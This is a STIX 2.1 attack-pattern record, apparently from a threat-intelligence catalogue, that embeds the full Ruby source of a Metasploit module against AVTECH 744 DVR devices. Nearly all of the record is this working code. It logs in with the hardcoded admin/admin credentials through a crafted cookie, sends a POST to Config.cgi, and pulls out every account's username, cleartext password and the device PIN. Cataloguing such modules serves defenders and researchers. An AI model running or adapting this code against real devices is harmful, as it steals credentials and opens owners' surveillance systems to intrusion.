{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6216ef25-e845-4269-ae85-c6f5bba382fa",
    "created": "2024-08-14T16:32:36.389285Z",
    "modified": "2024-08-14T16:32:36.389288Z",
    "name": "AVTECH 744 DVR Account Information Retrieval",
    "description": " This module will extract the account information from the AVTECH 744 DVR devices including usernames, cleartext passwords, and the device PIN, along with a few other miscellaneous details. In order to extract the information, hardcoded credentials admin/admin are used. These credentials can't be changed from the device console UI nor from the web UI. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/avtech744_dvr_accounts.rb",
            "external_id": "avtech744_dvr_accounts.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AVTECH 744 DVR Account Information Retrieval',\n      'Description'    => %q{\n        This module will extract the account information from the AVTECH 744 DVR devices,\n        including usernames, cleartext passwords, and the device PIN, along with\n        a few other miscellaneous details. In order to extract the information, hardcoded\n        credentials admin/admin are used. These credentials can't be changed from the device\n        console UI nor from the web UI.\n      },\n      'Author'         => [ 'nstarke' ],\n      'License'        => MSF_LICENSE\n    ))\n  end\n\n\n  def run\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/cgi-bin/user/Config.cgi',\n      'cookie' => \"SSID=#{Rex::Text.encode_base64('admin:admin')};\",\n      'vars_post' => {\n        'action' => 'get',\n        'category' => 'Account.*'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'No response received from the target')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::Unknown, 'An unknown error occurred')\n    end\n\n    raw_collection = extract_data(res.body)\n    extract_creds(raw_collection)\n\n    p = store_loot('avtech744.dvr.accounts', 'text/plain', rhost, res.body)\n    print_good(\"avtech744.dvr.accounts stored in #{p}\")\n  end\n\n  def extract_data(body)\n    raw_collection = []\n    body.each_line do |line|\n      key, value = line.split('=')\n      if key && value\n        _, second, third = key.split('.')\n        if third\n          index = second.slice(second.length - 1).to_i\n          raw_collection[index] = raw_collection[index] ||= {}\n          case third\n          when 'Username'\n            raw_collection[index][:username] = value.strip!\n          when 'Password'\n            raw_collection[index][:password] = value.strip!\n          end\n        elsif second.include?('Password')\n          print_good(\"PIN Retrieved: #{key} - #{value.strip!}\")\n        end\n      end\n    end\n\n    raw_collection\n  end\n\n  def extract_creds(raw_collection)\n    raw_collection.each do |raw|\n      unless raw\n        next\n      end\n\n      service_data = {\n        address: rhost,\n        port: rport,\n        service_name: 'http',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        module_fullname: self.fullname,\n        origin_type: :service,\n        private_data: raw[:password],\n        private_type: :password,\n        username: raw[:username]\n      }\n\n      credential_data.merge!(service_data)\n\n      credential_core = create_credential(credential_data)\n\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      login_data.merge!(service_data)\n\n      create_credential_login(login_data)\n    end\n  end\nend\n"
}